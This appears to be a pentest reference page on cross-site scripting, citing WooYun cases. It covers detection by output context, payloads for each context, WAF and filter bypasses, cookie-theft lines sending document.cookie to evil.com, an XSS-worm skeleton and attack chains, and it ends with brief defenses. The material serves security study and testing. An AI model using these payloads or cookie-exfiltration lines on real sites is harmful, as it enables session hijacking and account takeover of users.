# Web Security - XSS (Cross-Site Scripting)

> Source: WooYun vulnerability database (7,532 XSS cases) | split from web-injection.md

## 2. XSS (Cross-Site Scripting)

### 2.1 Nature of the Vulnerability

```
user input (data) -> unencoded output -> the browser parses it as code -> the script executes
```

**Core formula**: XSS = trust-boundary breach + output-context confusion (data changes meaning across HTML/JS/CSS/URL)

### 2.2 Detection Methods

#### High-Risk Output Points

| Output point | Trigger condition | Typical scenario |
|-------|---------|---------|
| User nickname/signature | On page load | Profile page, comments, friend list |
| Search-box echo | Search operation | Search-results page |
| Comments/messages | Content display | Forums, blogs, product reviews |
| Filename/description | File listing | Cloud drive, photo album |
| Email body/subject | On opening the email | Webmail systems |
| Order note | Viewed in the backend | E-commerce backend, ticketing system |

**Hidden output points** (easily missed): HTTP headers (XFF/UA written to logs), WAP submit shown on PC, client nickname rendered on web, draft box / moderation list

#### Quick Context Determination

```
Output inside <script>? -> JS context (check the quote type)
Output in an attribute value? -> attribute context (check the attribute type)
Output in tag content? -> HTML context (check special tags textarea/title)
Output in a URL? -> URL context (check protocol restrictions)
Output in CSS? -> CSS context (check expression() support)
```

### 2.3 Context-Specific Payloads

#### HTML Tag Content

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML Attribute Value

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript String

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL Context

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filter-Bypass Techniques

#### Encoding Bypass

```html
<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data protocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS encoding (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Tag/Attribute Mangling

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- case obfuscation -->
<script/src=//xss.com/x.js>            <!-- slash instead of space -->
<img src=x onerror=alert(1)>           <!-- no quotes -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- double-write bypass -->
<scr\x00ipt>alert(1)</script>          <!-- null-byte bypass -->
```

#### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF-Specific Bypass

```html
.<script src=http://localhost/1.js>.    <!-- SafeDog: dots before and after -->
<!--[if true]><img onerror=alert(1) src=--> <!-- comment interference -->
```

#### Length-Limit Bypass

```html
<script src=//xss.pw/j>                <!-- shortest external load -->
<!-- DOM concatenation -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- string concatenation to bypass keyword filters -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly Bypass

- A Flash endpoint returning user info instead of a cookie
- Turn it into CSRF: directly perform a sensitive action (change password, add admin, read token)

### 2.5 Exploit Chains

#### Cookie Theft

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM-XSS Key Sources and Sinks

**Dangerous sources**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Dangerous sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS-Worm Core Logic

```javascript
// 1. get the current user's identity (cookie/token)
// 2. build content that includes the payload itself
// 3. auto-publish/share (AJAX POST)
// 4. trigger: it spreads on view/visit
function worm(){
    jQuery.post("/api/post", {"content": "<self-propagating payload>"})
}
worm()
```

#### Combined-Exploitation Patterns

```
XSS + CSRF -> obtain the token and perform admin actions
XSS + SQLi -> blind XSS to grab the cookie -> backend injection
XSS -> account hijack -> privilege escalation -> worm propagation
Blind XSS (messages/tickets/feedback) -> grab the backend admin cookie
```

### 2.6 Defenses

- **Output encoding** (core): HTML entities in HTML context, JS encoding in JS context, URL encoding in URL context
- A CSP policy restricting script sources
- HTTPOnly protects the cookie
- Allowlist input validation (avoid blacklists; they always miss cases)
- **Common mistakes**: only filtering the script tag, only filtering lowercase, front-end filtering bypassable via capture, single-pass filtering bypassed by double-write

---

